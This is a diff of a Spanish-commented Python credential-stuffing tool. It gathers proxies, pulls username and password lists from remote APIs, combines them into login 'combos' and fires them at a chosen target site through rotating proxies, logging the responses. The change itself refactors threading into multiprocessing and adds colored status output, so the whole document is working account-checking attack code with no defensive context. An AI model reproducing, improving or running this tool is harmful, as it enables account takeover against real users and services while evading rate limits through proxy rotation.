@@ -2,18 +2,20 @@ import argparse
 import random
 import inquirer
 import requests
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ProcessPoolExecutor
 from tqdm import tqdm
 import sqlite3
 import httpx
 import signal
 import sys
+import os
 import time
 import json
+from colorama import Fore, Style
 
 # Constantes
-MAX_RETRIES = 3  # Máximo de intentos de reintentar obtener contraseñas con un proxy
-REQUEST_TIMEOUT = 1  # Tiempo máximo de espera para solicitudes en segundos
+MAX_RETRIES = 3
+REQUEST_TIMEOUT = 1
 REQUEST_TIMEOUT_CHECK_PROXY = 2
 DATABASE_PATH = None
 NEW_URL = False
@@ -21,10 +23,11 @@ DOMAIN_URL = None
 SERVICE_NAME = None
 USER_API_URL = None
 PASS_API_URL = None
+MAX_WORKERS = None
 
 def signal_handler(sig, frame):
     time.sleep(2)
-    print("Ctrl+C presionado. Cancelando la ejecución...")
+    print(f"{Fore.YELLOW}Ctrl+C presionado. Cancelando la ejecución...{Style.RESET_ALL}")
     sys.exit(0)
 
 def load_config():
@@ -33,22 +36,41 @@ def load_config():
         config = response.json()
         return config
     except Exception as e:
-        print(f"Error al cargar la configuración: {e}")
+        print_error(f"Error al cargar la configuración: {e}")
         sys.exit(1)
+
+def print_error(message):
+    print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
+
+def print_success(message):
+    print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
+
+def print_warning(message):
+    print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
+
+def get_max_workers():
+    try:
+        cpu_cores = os.cpu_count()
+        max_workers = min(cpu_cores * 2, 10)
+        return max_workers
+    
+    except Exception as e:
+        print_error(f"Error al obtener el número de núcleos de la CPU: {e}")
+        return None
 
 def create_tables(conn, config):
     try:
         cursor = conn.cursor()
 
-        # Crear tablas según la configuración
         for table_name, columns in config["database"]["tables"].items():
             columns_definition = ', '.join(columns)
             cursor.execute(f"CREATE TABLE IF NOT EXISTS {table_name} ({columns_definition})")
 
         conn.commit()
         cursor.close()
+        print_success("Tablas creadas correctamente.")
     except Exception as e:
-        print(f"Error al crear las tablas en la base de datos: {e}")
+        print_error(f"Error al crear las tablas en la base de datos: {e}")
         sys.exit(1)
 
 def check_proxy(proxy):
@@ -67,6 +89,7 @@ def insert_proxy(conn, proxy):
         cursor.execute("INSERT INTO proxys (ip, port) VALUES (?, ?)", (ip, port))
         conn.commit()
         cursor.close()
+        print_success(f"Proxy insertado en la base de datos: {proxy}")
     except Exception as e:
         pass
 
@@ -77,8 +100,9 @@ def insert_usernames(conn, usernames):
             cursor.execute("INSERT INTO Usernames (username) VALUES (?)", (username,))
         conn.commit()
         cursor.close()
+        print_success("Usernames insertados correctamente.")
     except Exception as e:
-        print(f"Error al insertar los usernames en la base de datos: {e}")
+        print_error(f"Error al insertar los usernames en la base de datos: {e}")
 
 def insert_passwords(conn, passwords):
     try:
@@ -87,8 +111,9 @@ def insert_passwords(conn, passwords):
             cursor.execute("INSERT INTO Passwords (password) VALUES (?)", (password,))
         conn.commit()
         cursor.close()
+        print_success("Passwords insertados correctamente.")
     except Exception as e:
-        print(f"Error al insertar los passwords en la base de datos: {e}")
+        print_error(f"Error al insertar los passwords en la base de datos: {e}")
 
 def get_usernames(proxy):
     try:
@@ -115,35 +140,33 @@ def get_passwords(proxy):
         return []
     except KeyboardInterrupt:
         time.sleep(2)
-        print("Ctrl+C presionado. Cancelando la ejecución...")
+        print(f"{Fore.YELLOW}Ctrl+C presionado. Cancelando la ejecución...{Style.RESET_ALL}")
 
 def generate_combos(conn):
     try:
         cursor = conn.cursor()
-        cursor.execute("DELETE FROM Combos")  # Limpiar tabla de combos antes de regenerar
+        cursor.execute("DELETE FROM Combos")
         cursor.execute("SELECT username FROM Usernames")
         usernames = [record[0] for record in cursor.fetchall()]
         cursor.execute("SELECT password FROM Passwords")
         passwords = [record[0] for record in cursor.fetchall()]
 
-        # Generar combos y agregarlos a la base de datos
-        for _ in range(100):  # Número arbitrario de combos a generar
+        for _ in range(100):
             username = random.choice(usernames)
             password = random.choice(passwords)
             cursor.execute("INSERT INTO Combos (username, password) VALUES (?, ?)", (username, password))
 
         conn.commit()
         cursor.close()
+        print_success("Combos generados correctamente.")
 
     except Exception as e:
-        print(f"Error al generar combos: {e}")
+        print_error(f"Error al generar combos: {e}")
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Tu descripción del script")
-
     parser.add_argument("--url", "-u", dest="new_url", metavar="NEW_URL", type=str, help="Establecer una nueva URL")
     parser.add_argument("--site", "-s", dest="service", metavar="SERVICE", type=str, help="Establecer el servicio objetivo")
-
     return parser.parse_args()
 
 def get_proxies():
@@ -158,34 +181,34 @@ def get_proxies():
                 pass
     except KeyboardInterrupt:
         time.sleep(2)
-        print("Ctrl+C presionado. Cancelando la ejecución...")
+        print(f"{Fore.YELLOW}Ctrl+C presionado. Cancelando la ejecución...{Style.RESET_ALL}")
     return proxies
 
 def working_proxies():
     try:
-        print('Searching and Checking proxies...')
-        with ThreadPoolExecutor() as executor:
-            proxies = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
+        print(f"{Fore.CYAN}Searching and Checking proxies...{Style.RESET_ALL}")
+        with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            proxies = list(tqdm(executor.map(check_proxy, get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
 
         working_proxies_list = [proxy for proxy in proxies if proxy is not None]
-        print(f'Found {len(working_proxies_list)} working proxies.')
+        print_success(f'Encontrados {len(working_proxies_list)} proxies funcionando.')
 
         if not working_proxies_list:
-            print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxies")
+            print_warning("CANCELADA LA VERIFICACIÓN DE CUENTAS POR FALTA DE PROXIES")
             sys.exit(0)
 
         return working_proxies_list
     except Exception as e:
-        print(f"An error occurred in 'working_proxies': {e}")
+        print_error(f"An error occurred in 'working_proxies': {e}")
         return []
 
 def send_http_requests(conn, combos_len, domain_url, service_name):
     try:
-        with ThreadPoolExecutor() as executor:
+        with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
             combos = [(record[0], record[1]) for record in conn.execute("SELECT username, password FROM Combos").fetchall()]
             working_proxies_list = working_proxies()
-            
-            results = list(executor.map(lambda x: request_web_combos(combos_chunk=x, proxies=working_proxies_list, domain_url=domain_url, service_name=service_name), [combos[i:i + 100] for i in range(0, len(combos), 100)]))
+
+            results = list(executor.map(request_web_combos, [(combos[i:i + 100], working_proxies_list, domain_url, service_name) for i in range(0, len(combos), 100)]))
 
         with open('results.txt', 'w') as results_file:
             for result_set in results:
@@ -193,11 +216,11 @@ def send_http_requests(conn, combos_len, domain_url, service_name):
                     print(result)
                     results_file.write(result + '\n')
     except Exception as e:
-        print(f"Error al enviar solicitudes HTTP: {e}")
+        print_error(f"Error al enviar solicitudes HTTP: {e}")
 
-def request_web_combos(combos_chunk, proxies, domain_url, service_name):
-    """Envía solicitudes HTTP para combos de usernames y passwords."""
+def request_web_combos(args):
     try:
+        combos_chunk, proxies, domain_url, service_name = args
         results = []
         description = f"Sending HTTP Requests to {domain_url}"
 
@@ -210,16 +233,17 @@ def request_web_combos(combos_chunk, proxies, domain_url, service_name):
                 response.raise_for_status()
                 results.append(response.text)
             except requests.RequestException as e:
-                # Manejar errores de solicitud, incluida la cancelación
                 pass
         return results
     except Exception as e:
-        print(f"Error en la función request_web_combos: {e}")
+        print_error(f"Error en la función request_web_combos: {e}")
         return []
 
 def main():
     signal.signal(signal.SIGINT, signal_handler)
     args = parse_arguments()
+    global MAX_WORKERS
+    MAX_WORKERS = get_max_workers()
     try:
         global config, conn, DATABASE_PATH, USER_API_URL, PASS_API_URL
         config = load_config()
@@ -231,26 +255,25 @@ def main():
         with sqlite3.connect(DATABASE_PATH) as conn:
             create_tables(conn, config)
 
-            with ThreadPoolExecutor() as executor:
-                proxies = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
+            with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                proxies = list(tqdm(executor.map(check_proxy, get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
             
             working_proxies_list = [proxy for proxy in proxies if proxy is not None]
-            print(f'Found {len(working_proxies_list)} working proxies.')
+            print_success(f'Encontrados {len(working_proxies_list)} proxies funcionando.')
             
             if not working_proxies_list:
-                print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxies")
+                print_warning("CANCELADA LA VERIFICACIÓN DE CUENTAS POR FALTA DE PROXIES")
                 return
 
-            with ThreadPoolExecutor() as executor:
-                usernames = list(tqdm(executor.map(lambda x: get_usernames(x), working_proxies_list), total=len(working_proxies_list), desc="Searching Usernames and Passwords", unit=" combos_proxy"))
+            with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                usernames = list(tqdm(executor.map(get_usernames, working_proxies_list), total=len(working_proxies_list), desc="Searching Usernames and Passwords", unit=" combos_proxy"))
 
-            with ThreadPoolExecutor() as executor:
-                passwords = list(tqdm(executor.map(lambda x: get_passwords(x), working_proxies_list), total=len(working_proxies_list), desc="Checking Valid Formats"))
+            with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                passwords = list(tqdm(executor.map(get_passwords, working_proxies_list), total=len(working_proxies_list), desc="Checking Valid Formats"))
 
-            generate_combos(conn)  # Generar combos antes de enviar solicitudes HTTP
-
+            generate_combos(conn)
             combos_len = min(len(usernames), len(passwords))
-            print(f'Obtained {combos_len} usernames and passwords.')
+            print_success(f'Obtenidos {combos_len} usernames y passwords.')
 
             if args.new_url:
                 DOMAIN_URL = args.new_url
@@ -275,7 +298,7 @@ def main():
             send_http_requests(conn=conn, combos_len=combos_len, domain_url=DOMAIN_URL, service_name=SERVICE_NAME)
 
     except requests.RequestException as e:
-         print(f"Error inesperado: {e}")
+        print_error(f"Error inesperado: {e}")
 
 if __name__ == "__main__":
     main()
